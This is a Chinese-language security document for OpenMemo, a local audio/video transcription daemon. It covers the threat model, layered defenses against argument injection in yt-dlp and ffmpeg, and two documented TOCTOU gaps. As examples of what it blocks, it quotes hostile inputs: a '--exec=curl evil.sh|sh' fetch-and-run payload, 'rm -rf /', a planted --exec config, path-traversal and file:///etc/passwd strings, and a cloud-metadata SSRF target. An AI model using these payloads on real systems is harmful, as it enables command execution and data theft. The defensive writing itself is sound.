# OpenMemo 安全说明

> 维护者：`gpu-runtime` · 最后更新：2026-08-02 · 依据：ADR-003、ADR-008 决策 4、D-01 §8
>
> **本文件存在的理由（ADR-008 决策 4 原话）**：
> **「风险被记录下来才叫接受风险，没记录就是忽略风险。」**
>
> 本文档记录 OpenMemo 的攻击面、已实施的防护、以及**两个明确已知但当前未修复的缺口**。
> 每个缺口都写明：位置、触发前提、为何判定当前可接受、以及**在什么条件下必须立即修复**。

---

## 0. 威胁模型（先说清楚我们在防谁）

OpenMemo 当前的部署形态（ADR-003 决策 1）：

```
浏览器（本机）──HTTP/SSE/WS──> daemon（监听 127.0.0.1，随机 token 鉴权）
                                   │ 子进程
                                   ├─ ffmpeg / ffprobe
                                   ├─ yt-dlp（可选，GPLv3+）
                                   ├─ whisper-cli / whisper-vad-speech-segments
                                   └─ llama-server
```

| 假设                        | 说明                                                                           |
| --------------------------- | ------------------------------------------------------------------------------ |
| **单用户、个人自用**        | ADR-002 v2 已定。没有多租户，没有权限分级                                      |
| **daemon 只绑 `127.0.0.1`** | 绝不 `0.0.0.0`。这条是硬性的 —— memo.ac 的 `whisper-server` 犯过这个错（R-01） |
| **token 鉴权**              | daemon 启动生成随机 token，网页必须带 token 才能调 API                         |
| **本机其它进程被视为可信**  | ← **这是最重要的一条假设，也是 §3 两个缺口可被接受的前提**                     |

### 我们防的是什么

1. **用户粘贴的恶意 URL / 文件名 / 字幕内容** —— 主要攻击面，用户可能被钓鱼、可能导入他人分享的链接
2. **恶意/被攻陷的远端服务器** —— 返回恶意媒体文件、恶意 RSS feed、恶意 HLS 播放列表
3. **恶意网页**（用户在另一个标签页打开）试图打我们的本地 API（CSRF / DNS rebinding）
4. **SSRF**：把我们的下载器当作跳板去访问用户内网、云元数据端点、或**我们自己的 daemon**

### 我们**不**防的是什么（明确的非目标）

- 本机上已经在运行的恶意进程（它已经能读用户全部文件了，我们防不住也没意义）
- 物理接触攻击者
- 恶意的模型权重文件（我们校验 SHA256 防篡改，但不做模型内容审计）
- 供应链攻击（依赖 lockfile + CI 许可证白名单，但不做深度审计）

## 1. 子进程参数注入防护（7 层）

**这是本项目最高风险点**：用户粘贴的 URL 会进入 `yt-dlp` / `ffmpeg` 的命令行。

实现：`packages/pipeline/src/subprocess/{argGuard,runner}.ts`
测试：`packages/pipeline/src/subprocess/__tests__/argGuard.test.ts`（**25 个攻击用例，全绿**）

### 关键认识：`shell: false` 挡不住参数注入

这是最容易被误解的一点。不经过 shell 消灭了 `; rm -rf /`、`$(...)`、反引号、管道这一整类攻击，
**但 argv 里一个以 `-` 开头的元素，仍然会被目标程序当成选项解析**。

用户完全可以把 `--exec=curl evil.sh|sh` 当作"URL"粘贴进来。没有 shell 参与，但 yt-dlp 会老老实实
把它当成 `--exec` 选项执行。

### 七层

| 层                    | 措施                                                                                                                                                                      | 实现位置                                  |
| --------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------- |
| **L1 架构隔离**       | `runner.ts` 是全包**唯一**允许 import `node:child_process` 的模块                                                                                                         | `subprocess/runner.ts`                    |
| **L2 绝不过 shell**   | `spawn(absBin, argv, {shell:false})`。Windows 拒绝 `.bat/.cmd/.ps1/.com/.vbs/.js`                                                                                         | `runner.ts` + `argGuard.isSafeExecutable` |
| **L3 URL 校验**       | scheme 白名单 / 拒凭据 / 拒私网 / 拒前导 `-` / 拒控制字符 / 长度上限（按**字节**）                                                                                        | `argGuard.validateHttpUrl`                |
| **L4 关掉工具危险面** | yt-dlp 强制 `--ignore-config --no-config-locations --no-exec --no-playlist`；ffmpeg `-protocol_whitelist`；prompt 截断 1024                                               | `sources/ytdlp.ts`、`audio/ffmpeg.ts`     |
| **L5 进程环境与资源** | env **白名单重建**（不是过滤）；剔除 `LD_PRELOAD`/`LD_LIBRARY_PATH`/`DYLD_*`/`NODE_OPTIONS`/`PYTHONPATH`；强制 timeout；SIGTERM→5s→SIGKILL 整个进程组；stdio 1MB 环形缓冲 | `runner.ts`                               |
| **L6 argv 不变量**    | 用户串只能是**一个完整独立的 argv 元素**，永不拼进别的参数、永不成为参数名                                                                                                | `argGuard.buildArgv`                      |
| **L7 路径穿越**       | `realpath` 后确认在受管根目录内；Windows 拒 UNC / 盘符相对路径                                                                                                            | `argGuard.assertWithinRoot`               |

### L2 的 Windows 细节（CVE-2024-27980）

Node 在 Windows 上执行 `.bat`/`.cmd` **必须**经过 `cmd.exe`，这会重新引入 shell 元字符解析 ——
这正是 CVE-2024-27980 的成因。既然整个设计建立在 `shell: false` 上，唯一能保住这个承诺的办法
就是**拒绝执行任何需要 shell 的东西**。只允许 `.exe`。

> ⚠️ **实测教训**：这条检查最初**用宿主的 `path.isAbsolute` 判断 Windows 路径**，在 Linux 上
> `isAbsolute('C:\\tools\\x.exe')` 返回 false，导致 Windows 路径一律先被判成穿越，
> **CVE 分支根本不可达 —— 而 `.bat` 的测试一直在"通过"，只是通过的理由是错的**。
> 已修（按目标平台选 `win32.isAbsolute` / `posix.isAbsolute`）。
> 教训写进 ADR-008：**断言拒绝的"错误码"，而不只是断言"被拒绝了"。**

### L3 的三个易错点（都已有对应测试）

1. **控制字符必须在 `new URL()` 之前检查。** `new URL()` 会**静默剥离** `\n`、`\t`、`\r`。
   先 parse 再查，等于把恶意串洗成看起来干净的串。
2. **长度必须按字节算。** `'😀'.repeat(1000)` 是 1000 字符但 **4000 字节**。按 `.length` 判会放行 4KB argv。
3. **我们自己就是 SSRF 的靶子。** daemon 绑在 `127.0.0.1`，所以
   "让下载器访问 `http://127.0.0.1:<port>/api/v1/settings`" 是针对我们自己 API 的
   confused-deputy 攻击。私网地址过滤里**必须包含回环**。

### L4 的实测验证（不是声称，是真跑过）

`--ignore-config` 是这一层最重要、也最容易被遗漏的一条：**攻击者只要能写一个 `yt-dlp.conf`，
就能注入 `--exec` 拿到任意命令执行。**

实测（T-025）：

```
planted /root/.config/yt-dlp/config  ->  --exec "touch /tmp/e2e/PWNED"
run YtDlpSource.probe(...)
result: PWNED file created? -> NO ✅ --ignore-config held
```

**这条防护经过真实攻击验证，不是纸面配置。**

## 2. 其它已实施的防护

### 2.1 路径与文件名（D-01 §8.5）

**根本策略：用户永远不提供文件名。** 所有落盘文件名由我们生成，用户提供的标题只存在 DB 的
展示字段里。这从根上消灭了 `../../../.ssh/authorized_keys`、Windows 保留名（`CON`/`PRN`/`COM1`）、
NTFS ADS（`file.txt:evil`）、Unicode 同形字、尾随空格/点等一整族问题。

必须接受路径的少数入口（"从磁盘导入"）走 `assertWithinRoot`：
**先 `realpath` 再比较** —— 只做 `path.resolve` 的词法比较会被 symlink 骗过（有对应测试）。

### 2.2 媒体协议白名单

ffmpeg 不只是转码器，它是一个**协议客户端**，认识 `concat:`、`subfile:`、`file:` 等。
一个精心构造的 HLS 播放列表可以让它**读取本地任意文件并拼进输出**。

- 处理本地文件：`-protocol_whitelist file`
- 处理远程/HLS：`-protocol_whitelist https,tls,tcp,crypto,httpproxy` —— **不含 `file`**

另外：**用户可控字符串绝不进 `-filter_complex` / `-vf` / `-metadata`**。
filter 语法有自己的转义规则（`:` `,` `[` `]` `'` `\`），是嵌在单个 argv 元素**内部**的第二套注入语法。

### 2.3 RSS / XML

`RssSource` 用小型标签扫描器而非通用 XML 解析器。理由：我们只需要四个字段，而 XML 解析器是
经典的 XXE 载体。**我们不实现实体展开、不取 DTD、不跟随外部引用**，并且**携带 `<!DOCTYPE>` 或
`<!ENTITY>` 的 feed 直接拒绝**。

feed 里的每个 enclosure URL **都要重新过一遍 `validateHttpUrl`** —— 恶意 feed 只是提供
`file:///etc/passwd` 的另一种方式。

### 2.4 解压（GPU 后端包）

Zip-Slip、symlink/hardlink 条目、绝对路径条目、`..` 条目一律拒绝；限制总解压大小、条目数、
单文件压缩比（防 zip bomb）；**解压前先校验整包 SHA256**（ADR-004 决策 5 —— Ollama 的下载器
没做校验，我们必须补上）。

### 2.5 崩溃隔离

所有原生工具走**子进程**（ADR-003 决策 1）。这不只是架构洁癖：T-012 实测发现，
whisper.cpp 在后端库缺失时会调 `ggml_abort()` 直接 SIGABRT 退出（exit 134），
**进程内 N-API 绑定会把整个 daemon 一起打死**。

## 3. ⚠️ 已知未修复的缺口（ADR-008 决策 4 要求逐条记录）

> 以下两个缺口 **Manager 已明确裁决"不阻塞 v1"**，依据是 §0 的威胁模型。
> 记录在此，任何人在改变部署形态前必须先读这一节。

### 缺口 1：DNS Rebinding（TOCTOU）

| 项                        | 内容                                                                                                                                                                                                                                                                                                                                     |
| ------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **位置**                  | `packages/pipeline/src/subprocess/argGuard.ts` → `assertHostNotPrivate()`                                                                                                                                                                                                                                                                |
| **性质**                  | Time-of-check to time-of-use（检查与使用之间的时间窗口）                                                                                                                                                                                                                                                                                 |
| **具体机制**              | `assertHostNotPrivate()` 用 `dns.lookup()` 解析主机名，确认解析结果不是私网地址。但**真正发起连接时会再解析一次**。控制 DNS 的攻击者可以让第一次解析返回公网 IP（通过检查），第二次返回 `127.0.0.1` 或 `169.254.169.254`（实际连接）。                                                                                                   |
| **触发前提**              | ① 攻击者控制一个域名的权威 DNS；② **用户被诱导粘贴该域名的 URL**；③ 攻击者能设置极短 TTL 并在两次解析之间切换应答                                                                                                                                                                                                                        |
| **可造成的影响**          | 让 daemon 向本机其它服务或云元数据端点发起 HTTP GET，并把响应体当作"媒体文件"下载到临时目录。**注意**：daemon 不会把该内容回显给网页（它会先过 ffprobe，非媒体文件会被拒绝并删除），因此这是一个**盲 SSRF**，攻击者拿不到响应内容。                                                                                                      |
| **为何判定当前可接受**    | ① 需要用户主动粘贴攻击者的 URL（社工前提）；② 是盲 SSRF，无回显；③ 本产品是个人自用，本机通常没有其它敏感的 localhost 服务；④ 云元数据端点场景不适用（不部署在云上）；⑤ 字面 IP 的私网过滤**已经生效**，只有主机名路径存在此窗口                                                                                                         |
| **🚨 必须立即修复的条件** | **只要满足下列任意一条**：<br>① 改为**多用户**部署；<br>② daemon 监听地址改为非 `127.0.0.1`（任何形式的联网部署）；<br>③ 部署到**云主机**（元数据端点 `169.254.169.254` 会立刻变成真实高危目标）；<br>④ 增加任何会把下载内容**回显给调用方**的功能（盲 SSRF 变成有回显 SSRF）；<br>⑤ 本机开始运行其它 localhost 服务（如数据库管理面板） |
| **修复方案**              | 把解析得到的 IP **钉进连接**：用自定义 `lookup` hook（`undici.Agent({connect:{lookup}})` 或 `http.request({lookup})`）强制连接到校验时那个 IP，而不是重新解析。必须同时处理重定向（每一跳都要重新校验）。                                                                                                                                |

### 缺口 2：文件路径 TOCTOU

| 项                        | 内容                                                                                                                                                                                                                            |
| ------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **位置**                  | `packages/pipeline/src/subprocess/argGuard.ts` → `assertWithinRoot()`，以及其调用方 `media/sources/localFile.ts`                                                                                                                |
| **性质**                  | Time-of-check to time-of-use                                                                                                                                                                                                    |
| **具体机制**              | `assertWithinRoot()` 用 `realpath` 解析路径并确认它在受管根目录内，然后把**路径字符串**交给下游（ffprobe / ffmpeg）。在"校验通过"和"下游 open()"之间，攻击者可以把路径中的某一段替换成指向根目录外的 symlink。                  |
| **触发前提**              | **本机已经存在一个恶意进程**，且它对相关目录有写权限，且能精确抢到那个时间窗口                                                                                                                                                  |
| **可造成的影响**          | 让 ffprobe/ffmpeg 读取受管根目录之外的文件。由于输出只是转写文本，理论上可以把某个文本文件的内容"转写"出来——但实际上 ffprobe 会因为不是媒体文件而拒绝。                                                                         |
| **为何判定当前可接受**    | **触发前提本身就已经越过了我们的威胁模型**（§0：本机其它进程视为可信）。一个已经能在用户目录里创建 symlink 的进程，本来就能直接读取用户的全部文件，无需绕道我们的转写功能。**修这个缺口不会提高实际安全性。**                   |
| **🚨 必须立即修复的条件** | ① 改为**多用户**部署（此时"本机其它进程"可能属于**别的用户**，前提不再成立）；<br>② daemon 以**更高权限**（root / 服务账户）运行 —— 那时它能读的文件比调用者多，缺口就有了实际价值；<br>③ 引入沙箱/多租户隔离后仍保留此代码路径 |
| **修复方案**              | D-01 §8.5 步骤 5 已给出：校验通过后**立即 `open()` 拿到 fd**，之后所有操作用 fd（`fstat` 复核 inode 与大小），不再用路径字符串。需要下游工具支持 `/dev/fd/N`（Linux/macOS 可行，Windows 需另想办法）。                          |

### 3.1 两个缺口的共同点

两者都是 **TOCTOU**，都**无法靠"再检查一次"修复** —— 再检查只是把窗口变小，不会消除。
真正的修复都是**把校验结果固化成句柄**（IP 固化成连接、路径固化成 fd），而不是重复校验字符串。

## 4. 其它已知限制（非缺口，但应知晓）

| 项                    | 说明                                                                                                                                                                                                         |
| --------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **代码签名**          | ADR-003 决策 4：不购买证书。macOS 仅 ad-hoc 签名 + 下载后清除 quarantine；Windows 完全不签名。**这意味着我们无法向用户证明二进制未被篡改**，只能靠 HTTPS + SHA256 manifest。改为公开分发时必须购买证书。     |
| **模型权重**          | 校验 SHA256 防传输篡改，但**不审计模型内容**。恶意模型理论上可以输出攻击性文本（如诱导用户执行命令的"转写结果"）。                                                                                           |
| **`vm2` 已禁用**      | ADR-003 明确禁止（已废弃 + 已知逃逸漏洞）。需要插件沙箱时用 `node:worker_threads` + 权限白名单。                                                                                                             |
| **yt-dlp 的固有风险** | 它是一个会执行大量站点特定解析逻辑的大型 Python 程序。我们用 `--ignore-config --no-exec` 收紧了它，并把它放在**可一键关闭**的适配层后面（TD-002 已关闭，实测关掉后产品仍可用）。**风险敏感的用户应关闭它。** |
| **浏览器端**          | daemon 端口漂移会让浏览器把它当作新站点（ADR-006 决策 2），麦克风等权限需重新授权。这是安全机制的正常表现，不是 bug。                                                                                        |
